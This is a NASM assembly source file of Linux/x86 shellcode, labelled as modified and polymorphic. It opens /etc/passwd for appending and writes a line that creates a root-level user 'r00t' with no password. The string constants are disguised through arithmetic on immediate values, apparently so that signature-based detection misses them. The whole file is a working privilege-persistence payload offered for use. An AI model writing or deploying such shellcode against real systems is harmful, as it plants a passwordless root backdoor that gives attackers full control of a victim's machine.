; MODIFIED SHELLCODE
; Filename: addr00tuser-poly.nasm
; Author: Jeremy Catelain
;69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
;for Linux/x86


section .text

      global _start

 _start:

 ; open("/etc//passwd", O_WRONLY | O_APPEND)

      push byte 5
      pop eax
      xor ecx, ecx
      push ecx
      mov esi, 0x53666162
      add esi, 0x11111211
      mov dword [esp-4], esi ; dwss
      sub esi, 0x3074444
      mov dword [esp-8], esi ; ap//
      sub esp, 8
      push 0x6374652f
      mov ebx, esp
      mov cx, 02001Q
      int 0x80

      mov ebx, eax

 ; write(ebx, "r00t::0:0:::", 12)

      push byte 4
      pop eax
      xor edx, edx
      push edx
      mov esi, 0x2805e3b8
      add esi, 0x12345678 
      mov dword [esp-4], esi ; :::0
      sub esp, 4
      push 0x3a303a3a ; :0::
      push 0x74303072 ; t00r
      mov ecx, esp
      push byte 12
      pop edx
      int 0x80

 ; close(ebx)

      push byte 6
      pop eax
      int 0x80

 ; exit()

      push byte 1
      pop eax
      int 0x80